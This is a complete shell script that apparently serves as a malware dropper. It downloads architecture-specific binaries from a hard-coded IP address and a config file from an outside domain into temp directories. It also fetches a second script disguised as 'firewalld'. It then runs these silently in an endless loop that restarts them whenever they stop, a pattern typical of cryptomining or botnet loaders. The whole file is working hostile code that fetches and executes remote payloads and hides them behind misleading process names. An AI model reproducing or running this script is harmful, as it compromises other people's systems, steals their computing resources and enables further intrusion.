#!/bin/sh

if [ -w "/dev/shm" ]; then
    DIR1="/dev/shm"
    DIR2=$HOME/.local    
elif [ -w "/var/tmp" ]; then
    DIR1="/var/tmp"
    DIR2=$HOME/.local    
elif [ -w "/tmp" ]; then
    DIR1="/tmp"
    DIR2=$HOME/.local
else
    exit 0
fi

ARM_BIN="sfe3.so"
X86_BIN="34cd.so"
ARM="http://121.127.34.102/$ARM_BIN"
X86="http://121.127.34.102/$X86_BIN"

AXAXA="https://cybercrim.es/axaxa.json"
ARCH=$(uname -m)

(
while true; do
    if [ ! -f ${DIR1}/crimson ]; then
        if [ "$ARCH" = "x86_64" ]; then
            curl -sL $X86 -o ${DIR1}/crimson
            chmod a+x ${DIR1}/crimson
        elif [ "$ARCH" = "aarch64" ] || [ "$ARCH" = "armv8l" ]; then
            curl -sL $ARM -o ${DIR1}/crimson
            chmod a+x ${DIR1}/crimson
        fi
    fi

    if [ ! -f ${DIR1}/axaxa.json ]; then
        curl -sL $AXAXA -o ${DIR1}/axaxa.json
        chmod a+x ${DIR1}/axaxa.json
    fi

    if [ ! -f ${DIR2}/firewalld ]; then
        curl -sL https://openstorage.org/firewalld -o ${DIR2}/firewalld
        chmod a+x ${DIR2}/firewalld
    fi

    if ! pgrep -f 'firewalld' > /dev/null; then
        cd ${DIR2}; sh firewalld > /dev/null 2>&1 &
    fi    

    if ! pgrep -f 'crimson' > /dev/null; then
        cd ${DIR1}; exec ./crimson -c ${DIR1}/axaxa.json > /dev/null 2>&1
    fi
    sleep 2
done
)
